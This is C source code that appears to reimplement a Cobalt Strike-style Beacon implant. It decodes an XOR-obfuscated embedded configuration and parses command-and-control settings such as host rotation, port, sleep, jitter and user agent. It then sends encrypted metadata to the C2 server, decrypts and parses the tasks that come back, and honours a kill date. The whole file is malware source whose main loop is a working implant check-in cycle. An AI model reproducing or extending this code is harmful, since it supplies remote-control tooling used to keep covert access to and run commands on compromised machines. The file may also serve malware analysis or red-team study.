#include "stdafx.h"
#define LTM_DESC
#define _CRT_SECURE_NO_WARNINGS
#include "tomcrypt.h"

#include "global.h"
#include "GetLastErrorEx.h"
#include "data_struct.h"
#include "http_tool.h"
#include "data_deal.h"
#include "polling.h"
#include "function.h"
#include "task.h"


#ifdef _M_X64
#pragma comment(lib,"tomcrypt_x64.lib")
#else
#pragma comment(lib,"tomcrypt.lib")
#endif


#pragma comment(lib,"Wininet.lib")
#pragma comment(lib,"ws2_32.lib")

int Beacon_init(HINSTANCE DLLH) {
	Dll_HINSTANCE = DLLH;
	for (int i = 0; i < 0x1000; ++i)
	{
		rawData[i] ^= 0x2Eu;
	}
#ifdef _M_X64
	CsC2Config = (DWORD_PTR)malloc(0x800u);
	memset((void*)CsC2Config, 0, 0x800u);
#else
	CsC2Config = (DWORD_PTR)malloc(0x400u);
	memset((void*)CsC2Config, 0, 0x400u);
#endif

	struc_1 v11;
	init_struc1(&v11, (char*)rawData, 4096);
	for (int j = get_short_struc1_index2(&v11); ; j = get_short_struc1_index2(&v11))
	{
		if (j <= 0)
			break;
		int data_type = get_short_struc1_index2(&v11);
		int data_size = get_short_struc1_index2(&v11);
#ifdef _M_X64
		int v5 = 16 * j;
#else
		int v5 = 8 * j;
#endif
		DWORD_PTR v6 = (v5 + CsC2Config);
		*(WORD*)(v5 + CsC2Config) = data_type;
		switch (data_type)
		{
		case 1:
			*(WORD*)(v5 + CsC2Config + sizeof(size_t)) = get_short_struc1_index2(&v11);
			break;
		case 2:
			*(DWORD*)(v5 + CsC2Config + sizeof(size_t)) = get_int_struc1_index2(&v11);
			break;
		case 3:
			*(DWORD_PTR*)(v6 + sizeof(size_t)) = (DWORD_PTR)malloc(data_size);
			void* v8 = get_ptr_struc1_index2_OffsetN(&v11, data_size);
			memcpy(*(void**)(v6 + sizeof(size_t)), v8, data_size);
			break;
		}
	}
	return 0;
	//return memset(Memory_addr, 0, sizeof(Memory_addr));
}


int main()
{
	Beacon_init(NULL);
	int nb = 0;
	DWORD Metadata_request_returns_size;
	DWORD http_get_server_output = get_DWORD(4); // .http-get.server.output
	char* lpszAgent;

	struc_1* struc1_v1 = (struc_1*)init_struc1_malloc_Memory(0x280);
	char* Metadata_get_request_url = (char*)get_ptr_struc1_index2_OffsetN(struc1_v1, 256);
	get_ptr_struc1_index2_OffsetN(struc1_v1, 256);
	int lpszServerName = 0;
	char* Buffer_host = (char*)get_ptr_struc1_index2_OffsetN(struc1_v1, 128);
	char* Source = get_str(8);
	DWORD nServerPort = get_short(2);
	dwMilliseconds = get_DWORD(3);
	lpszAgent = get_str(9);
	rotationstruc* Block = (rotationstruc*)malloc(0x10);
	DWORD v15 = get_DWORD(69);
	DWORD v14 = get_DWORD(70);
	DWORD v13 = get_DWORD(68);
	WORD v2 = get_short(67);                           // 67 68 69 70和轮询模式相关


	init_rotation(Block, v2, v13, v14, v15);//组合轮询
	if (Beacon_kill_data())
		Beacon_exit();
	jitter = get_short(5);
	char* Metadata = (char*)malloc(http_get_server_output);

	Generate_encryption_metadata(Metadata, http_get_server_output);              // 构造元数据并加密
	while (dwMilliseconds)
	{
		_snprintf(Buffer_host, 0x80, "%s", beacon_Rotation_Strategy(Block, Source, lpszServerName));// 轮询取出host
		lpszServerName = 0;
		_snprintf(Metadata_get_request_url, 0x80, "%s", beacon_Rotation_Strategy(Block, Source, 0));//取出元数据请求url
		dword_100331A8 = 1;

		_snprintf(Global_http_post_uri, 0x100, "%s", get_str(10)); //http-post.uri
		set_winit_http(Buffer_host, nServerPort, lpszAgent);// 设置一些东西

		Metadata_request_returns_size = call_send_Metadata(Metadata_get_request_url, Metadata, http_get_server_output);//发送元数据
		printf("返回数据大小:%d\n", Metadata_request_returns_size);

		int v18 = Metadata_request_returns_size;

		if (Metadata_request_returns_size > 0)// 大于零证明有数据返回需要解密
		{
			int return_data_size = Decrypt_return_data(Metadata_request_returns_size, Metadata);// 解密返回数据
			v18 = return_data_size;
			if (return_data_size > 0)                             // 解密成功
			{
				Parse_Task((TaskdataStruc*)Metadata, return_data_size);//格式化任务数据
			}

		}
		if (v18 == -1)                    // -1失败
		{
			lpszServerName = 1;
		}

		//Close_http_Handle();
		//call_sleep(dwMilliseconds);
		else {
			//sub_1000715A();

			//if (get_DWORD(28))
			//{
			//	sub_10003D57(4096);
			//}
			//else
			//{
			//	sub_10003D57(0x80000);
			//}
			//sub_10005DFB();
			//sub_10005725();
			//if (sub_10002ECF())
			//{
			//	end_beacon();
			//}
			if (Globala6 > 0)
			{
				Close_http_Handle();
				set_winit_http(Buffer_host, nServerPort, lpszAgent);
				send_generate_Metadata();
			}
		}
		Close_http_Handle();//防止内存泄露
		if (Beacon_kill_data())
		{
			Beacon_exit();
		}
		if (!dwMilliseconds)
		{
			break;
		}
		if (jitter)
		{
			//lpszServerNamea = ::dwMilliseconds * jitter / 0x64;
			//v10 = lpszServerNamea ? random_dword_4() % lpszServerNamea : 0;
			//v11 = ::dwMilliseconds;
			//if (v10 < ::dwMilliseconds)
			//{
			//	v11 = ::dwMilliseconds - v10;
			//}
			call_sleep(dwMilliseconds);
		}
		else
		{
			call_sleep(dwMilliseconds);
		}
	}

	free(Block);
	return 0;
}
